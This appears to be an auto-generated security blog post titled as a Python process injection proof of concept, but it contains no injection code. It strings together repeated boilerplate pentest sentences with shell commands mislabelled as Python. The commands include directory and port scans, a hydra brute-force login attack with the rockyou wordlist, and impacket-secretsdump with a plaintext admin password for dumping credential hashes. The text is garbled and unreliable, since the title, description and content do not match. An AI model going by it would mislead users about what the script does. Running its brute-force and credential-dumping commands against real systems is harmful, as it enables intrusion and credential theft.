---
TitleSEO: "Process Injection PoC in Python | ZureFX"
TitlePost: "Process Injection PoC — Python"
Author: "ZureFX"
Description: "A Python script for process injection poc. Built for security research and automation."
Keywords: "script, scanner, c, bash, go, python"
URL: "https://zurefx.github.io/scripting/script-process-injection-poc-421.html"
URL_IMAGES: ""
Date: "2026-02-05"
Tags: "Script, Scanner, C, Bash, Go, Python"
Section: "scripting"
Lang: "en"
main_img: "script-process-injection-poc-421"
Permalink: "/scripting/script-process-injection-poc-421.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `nikto`
- `socat`
- `smbclient`

## Implementation

### Core Logic

Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges.

```python
gobuster dir -u http://10.123.103.121/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p389,1521,389 10.17.173.64 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.43.147.227/FUZZ
```

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities.

### Helper Functions

The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.94.233.220 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.62.134.143
```

### Advanced Options

Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

```bash
gobuster dir -u http://10.107.243.186/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p9200,27017,8888 10.63.136.229 -oN scan.txt
nmap -sCV -p27017,8443,995 10.112.8.170 -oN scan.txt
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services.

```
[+] Scanning target...
[+] Found 1 results
[+] Done in 16.91s
```
